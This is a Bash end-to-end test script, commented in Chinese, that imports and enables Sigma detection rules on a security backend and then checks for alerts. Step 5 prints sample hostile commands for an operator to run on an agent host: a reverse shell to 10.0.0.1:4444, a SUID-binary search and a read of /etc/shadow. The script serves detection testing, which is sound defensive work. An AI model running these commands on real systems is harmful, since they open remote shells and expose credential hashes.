#!/bin/bash
# 端到端测试脚本 - 测试Agent异常命令上报功能
# 用法: ./scripts/test_malicious_command.sh [BACKEND_URL]

set -e

echo "=== Agent异常命令上报功能端到端测试 ==="
echo ""

# 配置
BACKEND_URL="${1:-http://localhost:8080}"
RULES_FILE="backend/rules/linux_suspicious_commands.yml"

echo "Backend URL: $BACKEND_URL"
echo ""

# 检查依赖
command -v curl >/dev/null 2>&1 || { echo "Error: curl not found"; exit 1; }
command -v jq >/dev/null 2>&1 || { echo "Error: jq not found"; exit 1; }

echo "[1/6] 检查Backend服务状态..."
if curl -s --connect-timeout 5 "${BACKEND_URL}/api/v1/hosts" > /dev/null 2>&1; then
    echo "  ✓ Backend服务正常运行"
else
    echo "  ✗ Backend服务未响应，请确保服务已启动"
    echo "    启动命令: docker-compose up -d 或 cd backend && go run ./cmd/server"
    exit 1
fi

echo ""
echo "[2/6] 导入Sigma规则..."
IMPORT_RESULT=$(curl -s -X POST -F "file=@${RULES_FILE}" \
    "${BACKEND_URL}/api/v1/detection/rules/import")
echo "  响应: $IMPORT_RESULT"
IMPORTED=$(echo "$IMPORT_RESULT" | jq -r '.imported // 0')
if [ "$IMPORTED" -gt 0 ]; then
    echo "  ✓ 成功导入 $IMPORTED 条规则"
else
    echo "  ! 规则导入可能失败，继续测试..."
fi

echo ""
echo "[3/6] 验证规则状态..."
RULES_COUNT=$(curl -s "${BACKEND_URL}/api/v1/detection/rules?status=experimental" | jq -r '.total // 0')
echo "  实验状态规则数量: $RULES_COUNT"

echo ""
echo "[4/6] 启用规则（将状态改为active）..."
# 获取规则列表并启用
RULES_IDS=$(curl -s "${BACKEND_URL}/api/v1/detection/rules?status=experimental" | jq -r '.data[].rule_id // empty')
for RULE_ID in $RULES_IDS; do
    curl -s -X PUT "${BACKEND_URL}/api/v1/detection/rules/${RULE_ID}/status" \
        -H "Content-Type: application/json" \
        -d '{"status": "active"}' > /dev/null
    echo "  已启用规则: $RULE_ID"
done

echo ""
echo "[5/6] 测试说明..."
echo "  请在Agent主机上执行以下恶意命令进行测试:"
echo ""
echo "  # 反弹Shell测试 (T1059.004):"
echo "  /bin/bash -c 'echo test: /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
echo ""
echo "  # 提权测试 (T1548):"
echo "  find / -perm -4000 2>/dev/null"
echo ""
echo "  # 凭据访问测试 (T1003):"
echo "  cat /etc/shadow"
echo ""

echo "[6/6] 检查告警（等待事件处理后）..."
echo "  等待10秒让事件处理完成..."
sleep 10

ALERTS=$(curl -s "${BACKEND_URL}/api/v1/detection/alerts")
ALERT_COUNT=$(echo "$ALERTS" | jq -r '.total // 0')
echo "  当前告警数量: $ALERT_COUNT"

if [ "$ALERT_COUNT" -gt 0 ]; then
    echo ""
    echo "  最新告警:"
    echo "$ALERTS" | jq -r '.data[0] | "    ID: \(.alert_id)\n    MITRE: \(.mitre_id)\n    严重程度: \(.severity)\n    状态: \(.status)"'
fi

echo ""
echo "=== 测试完成 ==="
echo ""
echo "手动验证步骤:"
echo "1. 检查Agent日志中是否有 'Rule matched' 记录"
echo "2. 检查Agent日志中是否有 'Events reported' 记录"
echo "3. 检查Backend日志中是否有 'event added to window' 记录"
echo "4. 访问前端 ${BACKEND_URL/:8080/:5173}/detection/alerts 查看告警页面"